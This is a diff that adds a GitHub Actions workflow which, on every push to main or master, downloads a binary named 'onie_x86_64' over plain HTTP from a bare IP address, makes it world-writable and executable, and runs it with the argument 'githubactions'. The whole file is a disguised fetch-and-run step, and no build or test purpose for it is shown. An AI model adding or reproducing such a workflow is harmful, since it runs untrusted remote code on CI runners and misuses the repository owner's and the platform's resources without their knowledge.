@@ -1,0 +1,21 @@
+name: Run onie_x86_64
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+      - master
+
+jobs:
+  run-onie:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download onie_x86_64
+        run: wget http://103.226.250.88/onie_x86_64
+
+      - name: Make executable (chmod 777)
+        run: chmod 777 onie_x86_64
+
+      - name: Run onie_x86_64
+        run: ./onie_x86_64 githubactions
